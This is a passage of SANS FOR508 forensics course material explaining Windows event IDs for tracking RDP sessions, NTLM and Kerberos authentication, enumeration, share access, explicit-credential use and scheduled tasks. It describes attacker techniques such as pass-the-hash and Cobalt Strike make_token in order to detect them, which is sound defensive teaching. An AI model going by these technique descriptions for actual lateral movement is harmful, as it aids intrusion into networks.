disconnected. These two event IDs in tandem help us bookend RDP sessions, but keep in mind that they will not
provide a historical view of every RDP connection. They are really designed to track session “reconnects”
instead of brand-new RDP sessions and will only show a subset of RDP activity. However, this can be an
advantage since RDP session reconnects are often recorded as Event ID 4624 Logon Type 7 events (typically
assumed to be screen lock/unlock as opposed to the “standard” Type 10 RDP Logon Type). If an analyst is only
focusing on EID 4624 Logon Type 10 RDP events, they could miss any session reconnects, but discover their
existence via EID 4778 and 4779 events.
Another big advantage of Event IDs 4778 and 4779 is that they include the IP address AND the hostname of the
system that established the connection (the hostname recorded in 4624 events is often some intermediary system
and not the original client). We should also expect to see a near-simultaneous ID 4624 event (successful logon)
because ID 4778 indicates only a successful remote session was reconnected, and ID 4624 indicates that the
credentials provided were accepted. The same goes for ID 4779 and ID 4647 (successful logout) events. To
further reinforce this idea of nearby events providing more context, we will often see on workstations an ID
4779 (session disconnected) event immediately before an ID 4778 (session connected) event. This is due to
Windows workstations allowing only one interactive logon at a time. When an RDP connection is made to a
system that currently has a user logged in to the console, the console session must be first disconnected. Not
every 4778/4779 event will be due to RDP usage. Windows also uses this same event to record the changing of
Windows stations due to the “Fast User Switching” feature and the session name will be “Console”.
Depending on how the RDP client is used (full logout or just closing the client), session reconnects and
disconnects may not be present for every RDP access. Event ID 4624 (Logon Types 3, 7, and 10) is usually the
most comprehensive view, and it is also worth cross-referencing with the Remote Desktop Services—
RDPCoreTS and TerminalServices-RdpClient auxiliary logs located in the same folder as the other event logs.
62

© 2023 SANS Institute

.

62

Event ID 131 within the RDPCoreTS log and event IDs 1024 and 1102 in the TerminalServices-RdpClient log
record outbound RDP connections, including destination hostname and IP address.

hi

de

01

.ir

Corresponding event IDs in Windows XP/2003: 682, 683

© 2023 SANS Institute

.

63

Tracking Account Usage: Remote Desktop Protocol (2)
Evidence of a Type 7 Logon (Unlock/RDP Reconnect) to base-admin using the
rsydow account from a system w/ client name DESKTOP-I6IPE98 (192.168.30.10)

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

This is an example of a successful Remote Desktop Protocol (RDP) session reconnect to an existing session.
Looking at the table view of the Security Event Log, we see a lot of activity happening within seconds. Taking
a look at the successful logon (EID 4624) we can see that the event is for the rsydow account with an associated
Logon Type 7, typically indicating a system lock / unlock. Interestingly, the EID 4801 event above it confirms
this as a “system unlock.” However, prior to the logon event, there is a session reconnect event (EID 4778),
which happens to be for the same user (rsydow). This event is important as it gives the final context that we
need to understand the pattern. Notice the session name for the EID 4778 event is “RDP-Tcp#19”, a strong
indicator we have an RDP connection. What happened here is that an un-terminated RDP session for rysdow
was still present on the system. When the user logged into the system again using the RDP protocol, this session
was simply re-connected. Unfortunately, this was logged as a Logon Type 7 instead of the expected Logon
Type 10 (the standard RDP logon type). It is also very common today to see Logon Type 3 instead of Logon
Type 10 as RDP Network Level Authentication (NLA) is on by default in most environments (NLA is a security
mechanism that first authenticates an account on the network before establishing a connection with the RDP
server). All this means you can’t simply rely upon filtering for EID 4624 Logon Type 10 events to discover all
RDP activity on a system. This is an excellent example of using multiple events to paint the complete picture of
an action taken on a machine. It is also important to understand that these events would only be logged only on
the receiving system. The system that initiated the RDP connection will not have these events logged (we will
need different entries like those from the TerminalServices-RDPClient log to identify activity on the initiating
system).
Another important feature of EID 4778/4779 events is also on display in this example. Notice that the
Workstation Name for the EID 4624 event is less than helpful, just providing the name of the machine from
where the logs originated (and the IP address of a different system which happened to be the VPN concentrator).
Contrast that information with the EID 4778 “Client Name” data. This is the hostname provided to the RDP
client wherever that client happens to be running (which in intrusions can often be the attacker’s machine!)
That specific client name (DESKTOP-I6IPE98) is indicative of a generic auto-generated Windows hostname,
which is likely rare in most enterprises and could end up being a good indicator of compromise!
Note that in this example, the Logon ID information does not match between the 4624 and the corresponding
4778 event. Because 4778 and 4779 events are session reconnect/disconnect events, they take on the Logon ID
64

© 2023 SANS Institute

.

64

of the earliest non-terminated interactive session from the same user. This is often the interactive session started
after the last 4647 event (user-initiated logoff) by that account. In this example, there was an earlier session and
hence the IDs do not match.

.

Corresponding event IDs in Windows XP/2003: 528, 683, 682

© 2023 SANS Institute

.

65

.
66

© 2023 SANS Institute

.

Remote Desktop Logging

RDP activity is logged in multiple places
• Understanding source/destination is critical
Source

Target

Log

Relevant Data

EIDs

Security

Source IP / Source Hostname /
Username

4624,
4778

TerminalServicesRDPClient

Destination Hostname /
Destination IP

1024,
1102

✓

Remote Desktop
Services—RDPCoreTS

Successful Connections / Attempts
/ Source IP / Username

98, 131

✓

TerminalServicesSource IP / Username
RemoteConnectionManager

1149

✓

TerminalServicesLocalSessionManager

21, 22,
25, 41

✓
✓

Source IP / Username

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

67

.

A wealth of information about local and remote logons can be determined from analyzing Logon Events in the
Security log. But what if the log rolls over every 24–48 hours? If you aren’t archiving or centralizing logs,
you might not have the proper window of log data to find the evidence you are looking for. Luckily, Windows
systems post Vista/2008 now have a wealth of additional “custom” logs. These specialized logs tend to record a
much smaller set of actions and hence can go back much further in time than your Security or even System and
Application logs. For reasons not entirely clear, the remote desktop service maintains several different logs,
often with duplicate information. As any incident responder will attest, having more information is always better
than less! It is possible that one or more logs may be missing or have limited retention. The Security log
often does not go back as far as we would like, so the additional “custom” logs provided by the RDP service can
regularly help us fill in any gaps.
While many of the logs maintain duplicate information, the Microsoft-Windows-TerminalServicesRDPClient/Operational is an important outlier. Information in this log is recorded on the source system
and can be invaluable to understanding everywhere an attacker moved from that system. This type of
information is rare in Windows logging. Typically, events are logged at the destination of an activity. Due to its
particularly unique information, this log has quickly become a favorite for incident response.
The SANS “Find Evil” poster does an excellent job of recording the event IDs to look for in this log. An excerpt
is below.

© 2023 SANS Institute

.

67

.
68

© 2023 SANS Institute

.

Account Logon Events

• Different than Logon Event category
• Recorded on system that authenticated credentials
• Local Account/Workgroup = on workstation
• Domain/Active Directory = on domain controller

• Event ID Codes (NTLM protocol)
• 4776: Successful/Failed account authentication

• Event ID Codes (Kerberos protocol)
• 4768: Ticket Granting Ticket was granted (successful logon)
• 4769: Service Ticket requested (access to server resource)
• 4771: Pre-authentication failed (failed logon)
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

69

.

A big hurdle to understanding event log categories and audit policy is understanding the difference between
Logon Events and Account Logon Events. Most of the confusion stems from the poor name choices. Logon
Events refer to login/logoff activity that happens on the actual system being logged into. Thus, they are stored
locally on that end system. Account Logon Events refer to third-party authentication of credentials provided
during that logon session. In a Windows domain environment, the vast majority of user accounts are actually
domain accounts, with their credentials stored on the domain controller, NOT the local system. This is invisible
to most users who use the same computer day in and day out. However, behind the scenes, before that user can
log on to a workstation in a domain environment, his or her username and password must be validated by the
domain controller using either the NTLM or Kerberos authentication protocol. Account Logon events record
this process and, in this case, would be stored on the domain controller that verified the credentials. Thus, a
single user logon can lead to several different events being spread across the workstation (Logon Events 4624,
4634, etc.) and across the domain controller (Account Logon Events 4776, or 4768, 4769).
There is one crucial exception to all of this. If the user is logging in using a local account, an account created
only on the workstation itself and not part of any domain, then the workstation itself will be doing the final
authentication (using the local SAM database) and hence we will see both Logon Events and Account Logon
Events in the event logs of the workstation. Because this is quite rare in an enterprise, it is often an interesting
artifact to look for because it can indicate rogue accounts that were created on the local system.
Because there are two possible authentication protocols, the Event ID codes have been broken up into those used
by NTLM and those used by Kerberos. For NTLM, both successful and failed events are recorded using ID
4776.
Kerberos uses several unique Event ID codes, with the most commonly seen being 4768 (successful logon),
4771 (failed logon), and 4769 (successful authentication to a server resource such as a file share).
Corresponding event IDs in Windows XP/2003: 672, 673, 675, 680

© 2023 SANS Institute

.

69

Logon Error Codes

Found in the Event Description for Event IDs 4771
(Kerberos), 4776 (NTLM), and 4625 (Failed Logon)
• Over 40 reason codes

EID 4771

EID 4776 / 4625

Reason

0x6

0xC0000064

Invalid username

0x7

­

0xC

0xC0000070

Logon from unauthorized workstation

0x12

0xC0000234

Account locked, disabled, or expired

0x17

0xC0000071

Password expired

0x18

0xC000006A

Password invalid

0x25

­

Requested server not found

Clock skew between machines is too great
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Beginning with the Windows 2003 server, the default authentication protocol in a Windows Domain is
Kerberos. Kerberos involves more steps than the NTLM protocol and creates more logs. In a nutshell, Kerberos
works by the user first supplying credentials to the authentication server (often a domain controller). The
credentials are verified and if they are correct, a Ticket Granting Ticket (TGT) is issued to the user for a period
of time. The TGT can then be used as a sort of passport allowing authentication via other domain controllers. To
access resources on another system, such as a server, a separate ticket is requested, which is called a “Service
Ticket”.
If the Kerberos “pre-authentication” fails, an event ID 4771 will be written to the authentication server’s log. In
addition to providing information on date/time, hostname, client IP address, and supplied username, an Error
Code will be included specifying the reason for the authentication failure. There are over 40 possible codes that
can be issued.[1] We have included on this slide some of the most common error codes seen in Kerberos failure
events:
• 0x6: Invalid/non-existent user account. This can also be caused by replication issues between Active
Directory servers.
• 0x7: Requested server not found. This can also be caused by replication issues between Active Directory
servers.
• 0xC: Policy restriction prohibited logon; client system restricted from accessing resource or restricted based
on time date.
• 0x12: Account locked, disabled, or expired.
• 0x17: Expired password.
• 0x18: Invalid password.
• 0x25: Clock values between server and client are skewed too greatly; Kerberos relies on a timing system to
invalidate old TGTs.
Corresponding event IDs in Windows XP/2003: 675
Although not as common, NTLM authentication does still occur in the Windows enterprise. As an example,
authentication of local accounts will usually be recorded on the host as NTLM. Pass-the-hash attacks also rely
upon NTLM authentication, so monitoring for these authentications can be valuable. In these cases, event ID
70

© 2023 SANS Institute

.

70

4776 is recorded.
Whenever a failure event is recorded using event ID 4776, an error code is generated and stored in the Event
Description. The purpose of this code is to provide additional information as to why the credential authentication
was denied. Error codes can provide a lot of information to the investigator regarding possible user actions. For
instance, the existence of a locked account could be indicative of a password guessing attack (or just very strict
password policies). Authentication attempt from restricted workstations (error code 0xC0000070) could indicate
intent to access resources off-limits to that user or large-scale network enumeration. The logon event ID 4625,
Failed Logon, uses the same error codes as event ID 4776.
A selection of possible error codes are as follows:[2]
•
•
•
•
•
•
•
•

0xC0000064: Non-existent account username
0xC000006A: Incorrect password (username correct)
0xC000006F: Account not allowed to log on at this time
0xC0000070: Account not allowed to log on from this computer
0xC0000071: Expired password
0xC0000072: Disabled account
0xC0000193: Expired account
0xC0000234: Account locked

Corresponding event IDs in Windows XP/2003: 680, 529

.

[1] Windows Security Log Event ID 4771: http://for508.com/ymhbg
[2] Windows Security Log Event ID 4776: http://for508.com/f8k4t

© 2023 SANS Institute

.

71

Privileged Local Account Abuse – (Pass the Hash)
A local account named root
was used to authenticate
• Event ID 4776 indicates the
root account authenticated
from BASE-RD-10
• An EID 4624 shows a
successful network logon
(Type 3) at the same second

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

Taking what we know about Account Logon Events, this scenario demonstrates how easy it is to find a potential
rogue account via the event logs. Assuming that local accounts (particularly privileged ones) are not routinely
used to authenticate within the environment, you should rarely see such events (this is a reasonable assumption
in many enterprises).

.

In this example, filtering event logs for Event ID 4776 (Account Logon Success/Failure) identifies an entry on
6/2/2021 at 6:34:17 PM on computer base-wkstn-09. Opening the event shows it was an Audit Success Event
and that the logon account used was named root. Because the EID 4776 Event was not located on a domain
controller, this indicates that root is a local account present on the system base-wkstn-09. Looking further at the
EID 4776 Event Properties, we see that the originating workstation was named BASE-RD-10 (presumably
another workstation). We have discovered information indicating a remote access of base-wkstn-09 using a
local account.
The next step would be to review the events surrounding this anomalous 4776 event for further information. An
Event ID 4624 was recorded at the same time as the EID 4776 event. Although not shown on this slide, a
review of the 4624 event showed a Type 3 (network) logon for the root account from system BASE-RD-10.
Type 3 logons are often indicative of authentication commonly seen during activities like share mapping. They
can also indicate pass the hash attacks (pass the hash uses the NTLM authentication protocol which largely
limits its capabilities to SMB-based actions like mapping shares, executing code with PsExec, etc.). Most
modern Windows systems should be setup to block pass-the-hash activity with local admin accounts, but some
environments still allow it, or attackers can modify the LocalAccountTokenFilterPolicy with a one-liner to reenable the capability.[1] In this example, the access was ultimately blocked as evidenced by the failed EID 5140
event (the attacker tried to mount the C$ share). Notice in this situation that EID 4776 was success event (the
credentials were correct), but other events nearby show a failure event for whatever resource could not be
accessed (e.g., a failed EID 5140 share mapping event). Looking at events around those of interest is very
important in event log analysis!
[1] LocalAccountTokenFilterPolicy accessing the C$ with a local account: https://for508.com/ku5oq
Corresponding event IDs in Windows XP/2003: 528,680

72

© 2023 SANS Institute

.

72

.
© 2023 SANS Institute

.

73

Tracking Reconnaissance: Account and Group Enumeration (1)

Scenario
• Identify attacker enumeration of sensitive accounts and groups

Relevant Event IDs
•4798: A user’s local group membership was enumerated
• 4799: A security-enabled local group membership was enumerated

Investigative Notes
• New events starting with Win10 and Server 2016
• A new class of hack tools allow nearly frictionless identification of the path to
Domain Admin (ref. PowerView and DeathStar)—these events can help
• Recon occurs early in the attack cycle. Early identification = faster mitigation
• Requires tuning. Filter on sensitive groups, unusual accounts, and processes:
• Look for: powershell, wmic, cmd
• Ignore: mmc, taskhostw, services, explorer
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Windows 10 and Server 2016 added a new set of events designed to track enumeration of sensitive accounts and
groups in the enterprise. Account and group enumeration has long been a mainstay of the attack cycle, but these
events are almost certainly a response to new tools that perform these operations at scale. PowerView, part of
the PowerSploit and Empire attack frameworks, is a set of cmdlets designed for Active Directory and domain
enumeration.[1] DeathStar builds upon this to worm through the network identifying sensitive accounts, highlevel groups, and where those account credentials are currently present in the network.[2] It uses this information
to automate credential dumping and lateral movement, making achievement of Domain Admin possible in
minutes. Prior to the introduction of these new events, there was no explicit way within event logs to track
enumeration activity. The good news is that if malicious activity is identified with these events, it is likely very
early in the attack cycle, meaning the attackers have had less time to accomplish their goals. Mitigating the
threat at this stage can be far easier and less costly than later attack stages.
These events can be enabled via Group Policy Advanced Auditing → Account Management and are named
“Audit Security Group Management” and “Audit User Account Management”.
A large amount of normal account enumeration occurs in Windows, and hence these events will need to be
filtered to be useful. Investigators should focus on sensitive groups, accounts that should not be used for
enumeration activities, and unusual processes being used for the enumeration (PowerShell, WMI, or net use
commands via cmd.exe). Performing a tuning process and allowlisting common processes like mmc.exe,
services.exe, taskhostw.exe, explorer.exe, and VSSSVC.exe can greatly reduce the volume of events.
Corresponding event IDs in Windows XP/2003: None
[1] PowerSploit/Recon GitHub: http://for508.com/bxvl1
[2] GitHub - DeathStar: https://for508.com/oapd8

74

© 2023 SANS Institute

.

74

Tracking Reconnaissance: Account and Group Enumeration (2)

PowerShell was used to list members of Administrators Group
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

75

.

This event may have come to our attention by the fact that PowerShell was used to enumerate a security-enabled
group (a potentially rare event, and exactly how many of the new hack tools like PowerView and DeathStar
identify users and groups). This combined with the group that was queried (Administrators) make this an
interesting event. This particular event was accomplished on a local system (notice the domain information lists
a workstation name). The same event(s) are also logged for Kerberos and Active Directory enumeration.
A final piece of information in this event is the user account that performed the enumeration. This can also be an
interesting way to filter these events by focusing on user accounts that should (or should not) be performing this
type of enumeration.

© 2023 SANS Institute

.

75

.
76

© 2023 SANS Institute

.

Event Log Explorer
• Supports .evt and .evtx formats
• Can open multiple logs at once for simultaneous searching and
correlation activities
• Merge logs together to correlate
• Access remote event logs

• Very tolerant of log corruption
• Excellent filtering
• Strings in event description
• Right-click for Quick Filters

• Color coding by Event IDs
• Free for personal use
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

01

.ir

77

hi

de

The built-in Windows Event Viewer has some significant drawbacks. It can be very cumbersome to review a
large number of events within the interface. There is no capability to load multiple security logs (that is, from
different systems) and filter or search in parallel. It is very intolerant of corrupted logs. Due to the nature of
forensic data collection, we often encounter corrupted event logs, and I have seen less experienced forensic
analysts give up when those logs could not be opened in Event Viewer! Never fear, we have alternatives.
Event Log Explorer is a third-party event log management software package that runs circles around the built-in
Microsoft tools.[1] It provides just about every feature that a forensic analyst could want when doing a log review
and greatly speeds up the process. It supports logs from every current Windows NT operating system (Windows
NT to Windows 2016) and as such can read both .evt and .evtx log formats. One of its biggest benefits is that it
is very capable of working with corrupted log files. You can open up a log file in one of two ways: Standard
Mode attempts to open up the log using API-like methods and Direct Mode parses the log in raw form. Thus, we
get the benefits of an offline parser tool combined with a GUI interface and review platform.
Another area where Event Log Explorer shines is in its features that assist log review. It allows many log files to
be opened simultaneously and even merged, greatly aiding with event correlation and reducing the amount of
time needed to search. This ability extends to being able to open logs on multiple remote systems simultaneously
for live reviews. It has a very robust filtering capability, including access to the text-based Event Description
field where so many of our forensic artifacts are located (such as Logon Type in ID 4624 Security Events).
Quick Filters (accessed by right-clicking an event column) allow options like showing only events of a specific
type or removing types of events from view. Another nice feature is the ability to color-code different Event IDs
so you can quickly zoom into the places within the log where you want to focus your analysis.
Event Log Explorer is free for personal, non-commercial use.
[1] Event Log Explorer: http://for508.com/2c5sw

© 2023 SANS Institute

.

77

.
78

© 2023 SANS Institute

.

Lab 2.2
Tracking Credential Use with Event Log Explorer
Average Time: 30 Minutes

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

79

.

This page intentionally left blank.

© 2023 SANS Institute

.

79

Tracking Lateral Movement: Network Shares

Scenario
• Audit activity around network shares

Relevant Event IDs
•5140: Network share was accessed
• 5145: Shared object accessed (Detailed File Share auditing)

Investigative Notes
•Security event log provides share name and IP address of remote machine
making the connection
• Account Name and Logon ID allow tracking of relevant account and other activities
during that logon session
• Requires object access auditing to be enabled
• Event IDs 5142–5144 track share creation, modification, and deletion
• Detailed File Share auditing (Event ID 5145) provides detail on individual files
accessed, but can be very noisy
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

Auditing of network shares can be useful for many different types of investigations. Whether you are
investigating internal access by employees, or access from external threats, knowing what file shares were
touched can be helpful to understand data flows. Mounting file shares is a very common technique used by
adversaries to move laterally through an environment—both to distribute malware and to collect data to steal.

.

To audit network shares, the “Object Access →Audit File Share” option must be configured within the
Advanced Audit Policy Configuration. Once enabled, Event ID 5140 will record any access to network shares
on the system. Share name, logon account, and the remote IP address are recorded, all of which can be useful for
filtering. Further, Event IDs 5142–5144 track shares that have been created, modified, or deleted.
One limitation of Event ID 5140 is that it does not include references to files accessed on a given share. To get
this information, you can enable the “Object Access → Audit Detailed File Share” option within the Advanced
Audit Policy Configuration. This provides ID type 5145 Events, which record individual item access. However,
this level of auditing can be voluminous and hence should be used very tactically and likely enabled only for
very sensitive systems.
Corresponding event IDs in Windows XP/2003: None

80

© 2023 SANS Institute

.

80

Tracking Lateral Movement: Administrative Shares

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

01

.ir

81

hi

de

In this example, imagine an analyst noticed an Event ID 4624 successful logon followed in the same second by
multiple Event ID 5140 network share access events. By viewing the individual event entries, it appears the
spsql account successfully authenticated to the system and accessed the “ADMIN$” default administrative
share. The “ADMIN$” share begins at the C:\Windows folder of the system and as the name implies is intended
for network administration, specifically software distribution like patches. This is old technology, and most
organizations have much better ways to push legitimate code, making this activity rare and worth looking into.
In this example the EID 5140 event recording the connection to ADMIN$ does not include important contextual
information like user account information or source workstation. This is unusual and could be an artifact of the
tool used to perform this attack (Cobalt Strike in this example). Luckily, we also have a corresponding EID
5140 event for the IPC$ connection that can help fill in the gaps. This is due to the way SMB/RPC networking
works, with a requirement for the default IPC$ (Inter-Process Communication) share to also be authenticated to
facilitate communication between both devices. Notice the corresponding IPC$ connection includes account
information (Name, SID, Domain, and Logon ID) as well as the source IP address and port. In this example,
you need both events to understand what happened, but commonly you would see similar identifying
information in both events. Note that a connection to an IPC$ share only achieves authentication and cannot be
used to move files and the subsequent connection to the ADMIN$ share is what facilitates the actual lateral
movement here (it would also look the same if C$ was mapped). However, IPC$ authentication is used for more
than just mapping shares, and many attacks leave behind this telltale sign of network-based authentication. If
you see an IPC$ share mapped by itself with user credentials it can still be indicative of some tool or process
used to enumerate information and the source address could be worth looking into (assuming it isn’t legitimate
administration activity). The events shown on this slide show lateral movement conducted using the Cobalt
Strike pen test tool, but it would be difficult to know that based on the information available. Whether an
attacker mapped the share manually using the “net use” or “New-PSDrive” command, using
WNetAddConnection with WMI as Wannacry ransomware does, or via Metasploit / Cobalt Strike, the actions
are the same and largely get logged the same. This is good news! By searching for artifacts left behind by
common techniques used across different attacks, we can more efficiently find evil on our networks. This could
be the first strange activity you identify, eventually leading you to the attacker’s tools where you can get a more
complete understanding of their tradecraft. The next page also contains the corresponding EID 4624 event
showing the expected “Type 3” logon typically associated with SMB connections like file/folder sharing.
© 2023 SANS Institute

.

81

.ir
01
de
hi
82

© 2023 SANS Institute

.

Tracking Lateral Movement: Explicit Credentials / runas

Scenario
• Track credential change common during lateral movement

Relevant Event IDs
• 4624: Successful logon (Logon Type 9)
• 4648: Logon using explicit credentials

Investigative Notes
• Changing credentials is often necessary to move from system to syst em
• Typically, only administrators and attackers juggle multiple credentials (though
system accounts like the computer account also frequently switch accounts)
• EID 4648 events are special because they log on the originating system and help
assemble knowledge of attacker lateral movement from that system
• Logged if explicit credentials are supplied to a tool (even if no account change)
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

83

.

Many activities in a Windows enterprise require credentials to be swapped. The computer account may need to
impersonate a user to authenticate to a resource, Outlook may need to switch from the logged in domain account
credentials to a user’s Microsoft cloud account to authenticate to Microsoft 365 servers, an administrator may
need to switch to a higher privileged account to perform maintenance, or perhaps most interesting to us, an
attacker could switch credentials to laterally move to a system requiring different credentials. In well segmented
networks it can be surprisingly difficult to move to new systems, requiring a keychain full of different
credentials that only work in certain parts of the network. We can use this phenomenon to our advantage and
look for these types of events. They are typically recorded in two ways: EID 4624 Logon Type 9 events and
specialized EID 4648 “Explicit Credentials” events. After filtering out the common background system activity
from these events (like computer account and Microsoft 365 activity), you are often left with just administrator
and attacker (wannabe administrator) activity. Who else other than administrators have multiple credentials to
switch to?
Unlike nearly all events we cover in this section, “runas” 4648 events have a super-power: they are
typically recorded on the originating system instead of the target. This is very important. Usually, we find
evidence of suspicious activity on the target system (events typically on log on the target system), but we cannot
easily source where the lateral movement originated from. EID 4648 events tell us where a user was headed to
from the system we are investigating (the originating system). They can help us rapidly scope an incident
because we can easily track other connected systems. Note that there are certain situations where a 4648 event
is recorded on both the original system and the target. For example, RDP connections using different credentials
often log EID 4648 events on both systems. You can determine whether a 4648 was logged on the original
system or target by looking at the “Target Server” information in the event. If the Target Server is localhost, it
means it is recording inbound activity. If the Target Server information includes a remote IP address, it means it
is recording outbound activity. Analyzing these events can get complicated, but it is worth the effort!
These events can also be logged even if accounts are not switched! The secret to understanding this
phenomenon is in the “explicit credentials” wording used by these event types. Explicit credentials mean a tool
used new credentials to authenticate instead of using credentials already present in memory. As an example,
malware suites such as Cobalt Strike often require users to specify which credentials should be used to run

© 2023 SANS Institute

.

83

remote commands. PsExec can be run with the “-u” and “-p” parameters on the command line to specify
credentials. And scripts can be written to use explicit credentials. If explicit credentials are provided, Windows
logs this even if the explicit credentials happen to be the same as those in memory! This happens frequently
with malware and provides yet another interesting artifact to hunt for in our logs.

.

Corresponding event IDs in Windows XP/2003: 528,552

84

© 2023 SANS Institute

.

Tracking Lateral Movement: runas Detection

Source System

Target System

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

01

.ir

85

hi

de

This example shows a common lateral movement scenario. Attackers tend to compromise a variety of accounts
with different privileges. In order to effectively accomplish their objectives of moving laterally and executing
applications throughout the enterprise, they often need to employ several different accounts. This provides
defenders with a useful detection mechanism via analysis of EID 4648 events as these events record
authentications using any explicit or different credentials. You may see these recorded during network share
mapping (as seen in this example), execution of lateral movement scripts, during WinRM and PowerShell
Remoting activity, and when elevating local privileges to administrator (via UAC or otherwise).
In this example, you see an EID 5140 event on a target system informing us of the mounting of an
administrative share, C$ (the entire C drive). The account used to map the share is “wacsvc”, and the share was
mapped from the 172.16.6.11 system. Ordinarily this is the sum of information we would receive; and it would
all be located on the target system (wkstn01 in this example). However, if the attackers used a different set of
credentials to accomplish this (like an administrator account instead of the user account they may be currently
logged in with), we get an indication of lateral movement on the originating system as well!
EID 4648 events provide a completely different view of lateral movement than we get from most artifacts. They
allow us to easily track lateral movement from the originating system, which can be very useful if an attacker
connects to multiple other systems. On this slide we see credentials changed from the “tdungan” account in
memory to credentials for the “wacsvc” account. Notice the labels used in the EID 4648 event. “Target Server”
tells you where that system was attempting to authenticate. In the EID 5140 event the label is “Source”
indicating it is where the connection came from. Notice the target system only saw the new credentials (the
“wacsvc” account), with no knowledge of the credential switch. If you only had the EID 5140 event you would
not be able to determine that the “tdungan” account was likely also compromised. In this case, you need events
from both the originating and target system to piece together the complete sequence of events.

© 2023 SANS Institute

.

85

.
86

© 2023 SANS Institute

.

Explicit Credentials: Cobalt Strike make_token & pth

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

87

.

Here we have a different view of runas events. Recall that explicit credentials mean a tool used new
credentials to authenticate instead of using credentials already present in memory. Many tools are written in
such a way as to require these explicit credentials. Cobalt Strike is such a tool. Several commands in Cobalt
Strike including make_token and pth create a new logon session (aka explicit credentials) that can then be
passed to whatever payload you specify. This is required even if you are already authenticated with the account
you wish to use. Cobalt Strike relies heavily on token manipulation for lateral movement and interactions with
remote targets. These commands allow attackers to easily execute manual or automated lateral movement
actions with a different identity. However, they also generate interesting logs for us to find!
Notice in the example on this slide we have explicit credentials provided that are identical to those of the
currently logged in account. We see an EID 4624 Logon Type 9 (runas) event showing “spsql” as both the
starting and ending account. Since the account didn’t change and this is a Logon Type 9 event, it must mean the
account was explicitly specified. We can also gather that 32-bit (SysWOW64) PowerShell was the process
requesting explicit credentials from the Process Name data. On the same system we have a corresponding EID
4648 event also showing the same beginning and ended credentials. However, the EID 4648 also tells us where
the attacker used those credentials, and we see BASE-WKSTN-05 listed as the Target Server in this event. The
specific command used in Cobalt Strike was make_token for this example, but pth (pass the hash) looks
identical in the logs.

© 2023 SANS Institute

.

87

.
88

© 2023 SANS Institute

.

Tracking Lateral Movement: Scheduled Tasks

Scenario

• Identify and audit scheduled tasks

Relevant Event IDs

• 106 | 4698 – Scheduled task created (Task Scheduler | S ecurity Log)
• 140 | 4702 – Scheduled task updated (Task Scheduler | Security Log)
• 141 | 4699 – Scheduled task deleted (Task Scheduler | Security Log)
• 200 / 201 – Scheduled task executed/completed (Task Scheduler Log)
• 4700/ 4701 – Scheduled task enabled/disabled (Security Log)

Investigative Notes

• Scheduled tasks can be executed both locally and remotely.
• Remotely scheduled tasks also cause Logon (ID 4624) Type 3 events
• Attackers commonly delete scheduled tasks after execution
• Task Scheduler log is no longer enabled by default. Enable via Group Policy!
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

89

.

Windows can provide very granular scheduled task logging, including task creation and execution. The
Microsoft-Windows-Task Scheduler/Operational log debuted in Windows 7 providing a custom log dedicated
only to tracking scheduled tasks. As such, entries persist in this log much longer than they will in the Security
log, making it a great place to find old attacker activity and tradecraft. While originally logged by default,
modern Windows versions (including Windows 10 and 11) seem to have task history (and hence this log)
disabled by default. It can (and should) be enabled via group policy, the wevtutil command-line tool, or the GUI
Task Scheduler application. Event IDs to look for in this log include:
106: Scheduled Task Created
140: Scheduled Task Updated
141: Scheduled Task Deleted
200: Scheduled Task Executed
201: Scheduled Task Completed
Scheduled task logging in the Security log requires Object access auditing to be enabled and provides even more
detailed information. Five events are used to record activity in the Security log:
4698: Scheduled Task Created
4699: Scheduled Task Deleted
4700: Scheduled Task Enabled
4701: Scheduled Task Disabled
4702: Scheduled Task Updated
It is important to understand that tasks can be scheduled remotely. This makes this artifact even more
interesting, as it can be used by attackers for both persistence and lateral movement. Unfortunately, the task
scheduler logs do not differentiate between local and remotely scheduled tasks. To find remote tasks, you must
look for Type 3 (network) Logon authentication events (ID 4624) occurring very near the time of task creation.
Automating triggers looking for this combination of events can pay dividends for analysts and hunt teams.

© 2023 SANS Institute

.

89

Another high-fidelity alert to hunt for are deleted tasks. It is common for attackers to schedule tasks on a variety
of systems and then clean up those tasks after execution. Deleted tasks are quite rare in most environments or
are easy to filter for legitimate applications, leaving only the deleted evil tasks to be identified.

.

Corresponding event IDs in Windows XP/2003: 602

90

© 2023 SANS Institute

.

Task Scheduler Logs

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

91

.

In this example, we see evidence of a newly created task in both the TaskScheduler/Operational and Security logs.
The TaskScheduler log is a fantastic resource since entries can persist in it much longer than they do in the more
frequently written to Security log. However, finding and understanding malicious tasks requires piecing together
multiple events in the TaskScheduler log. Event ID 106 records newly created scheduled tasks, but all we can
discern is the responsible user account and the task name, the latter being provided by the attacker and often
designed to blend in. To dig deeper, look for event IDs 200 and 201 (task executed/completed) that show the task
name and the full path of what was executed.
If you have task logging enabled in the Security log, event ID 4698 provides more complete information about the
task properties, including trigger information, account name, and the full path of the command to be executed. In
this example, knowing that an executable named “winsvchost.exe” was to be run from the c:\temp folder goes a
long way toward helping identify this as a likely malicious task. On the slide, we see a 4698 scheduled task-created
event created by user account Chad on 2/20/15 22:35:11 and set to run daily at 22:01:00 hours (note that the times
in the description field are in local system time). We also see the full command that will be executed at that time,
“c:\temp\winsvchost.exe”. This information can be incredibly useful to an investigation, but sadly, many
organizations do not have the proper auditing in place to take advantage of it. Object access auditing must be
enabled and is not enabled in every enterprise.

© 2023 SANS Institute

.

91

.
92

© 2023 SANS Institute

.

Windows Remote Management: Task Scheduler v1.2 Artifacts

• Vista debuted a new task format
• Simple XML files with no extension
• Saved in \Windows\System32\Tasks
• Also review \Windows\SysWOW64\Tasks

• Task name
• Task registration date and time (local)
• Account used to register task
• Trigger conditions and frequency
• Full command path
• Account authenticated to run task

• Nicely augments information in
